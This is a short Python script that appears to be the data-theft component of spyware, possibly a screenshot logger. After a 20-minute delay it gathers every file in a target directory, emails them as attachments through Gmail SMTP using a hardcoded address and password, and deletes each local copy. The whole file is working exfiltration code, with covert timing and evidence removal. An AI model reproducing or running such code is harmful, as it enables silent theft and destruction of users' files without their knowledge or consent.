import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from os import listdir
from path import Path
import os
import time


def sendmail():
    time.sleep(1200)
    email = "testarena46@gmail.com"
    password = "Password@123"
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = "Enjoy!!"
    loc_ss = Path()
    if not os.path.exists(loc_ss):
        os.mkdir(loc_ss)
    os.chdir(loc_ss)

    body = "Here are the files"
    msg.attach(MIMEText(body, 'plain'))

    for filename in os.listdir():
        attachment = open(filename, "rb")
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)
        os.remove(filename)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email, password)
    text = msg.as_string()
    s.sendmail(email, email, text)
    s.quit()


sendmail()
